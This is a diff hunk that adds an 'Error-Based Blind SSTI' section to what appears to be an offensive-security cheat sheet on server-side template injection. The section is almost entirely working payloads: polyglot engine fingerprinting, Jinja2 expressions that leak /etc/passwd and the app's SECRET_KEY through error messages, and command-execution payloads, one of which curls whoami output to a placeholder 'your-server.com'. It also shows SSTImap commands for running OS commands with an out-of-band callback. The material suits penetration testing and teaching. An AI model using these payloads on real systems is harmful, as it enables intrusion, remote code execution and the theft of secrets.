@@ -146,10 +146,83 @@ __${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
 @System.Diagnostics.Process.Start("cmd.exe","/c whoami")
 ```
 
+## Error-Based Blind SSTI (2025 Technique)
+
+**Source:** "Successful Errors: New Code Injection and SSTI Techniques" by Vladislav Korchagin — PortSwigger Top 10 2025 #1. Adapted old SQL injection error-based techniques for template engines.
+
+**Core insight:** Trigger controlled errors that **reveal** execution results, bypassing the need for output reflection.
+
+### Polyglot Detection
+
+When you can't tell which engine, use error fingerprinting:
+
+```
+# The payload causes engine-specific errors
+{{7*'7'}}[[3*3]]<%= 7*7 %>${{3*3}}#{3*3}*{3*3}
+# Each engine breaks differently → fingerprint via error message
+```
+
+**Error-based fingerprinting workflow:**
+```bash
+# Send to Jinja2
+{{undefined_var}}
+# Error: "jinja2.exceptions.UndefinedError: 'undefined_var' is undefined"
+
+# Send to Twig
+{{undefined_var}}
+# Error: "Variable "undefined_var" does not exist."
+
+# Send to ERB  
+<%= undefined_var %>
+# Error: "undefined local variable or method `undefined_var'"
+```
+
+### Error-Based Data Extraction (Jinja2)
+
+```python
+# Traditional: need output reflection
+{{ config }}  # Output: <Config {'KEY': 'value'}>
+
+# Error-based: trigger error containing data
+{{ ''.__class__.__mro__[2].__subclasses__()[42]('/etc/passwd').read()[:50] + undefined }}
+# Error message contains the first 50 chars of /etc/passwd!
+
+# Extraction via exception
+{% set x = config['SECRET_KEY'] %}{% if x %}{{ x + undefined }}{% endif %}
+# If SECRET_KEY exists → error contains its value
+
+# Numeric extraction via type errors  
+{{ config['SECRET_KEY'][0:1] * 10000000000000 }}
+# Triggers integer overflow → error reveals character
+```
+
+### Blind RCE Confirmation (Out-of-Band)
+
+```python
+# Can't see output but want RCE confirmation
+# Use OOB callback (works with CallMeBack)
+{{ self.__init__.__globals__.__builtins__.__import__('os').system('curl https://your-server.com/$(whoami)') }}
+
+# Or via subprocess
+{{ self.__init__.__globals__.__builtins__.__import__('subprocess').check_output(['id']).decode() + undefined }}
+# Error contains command output!
+```
+
+### SSTImap Updated Usage
+
+```bash
+# SSTImap now includes error-based techniques
+python3 sstimap.py -u "http://target/?name=test" --technique error
+
+# Blind injection (no output in response)
+python3 sstimap.py -u "http://target/?name=test" --os-cmd "id" --technique oob \
+  --callback-url https://your-server.com/
+```
+
 ## Tools
 
 ```bash
-# SSTImap
+# SSTImap (updated with error-based techniques)
 python3 sstimap.py -u "http://target/?name=test"
 
 # TInjA
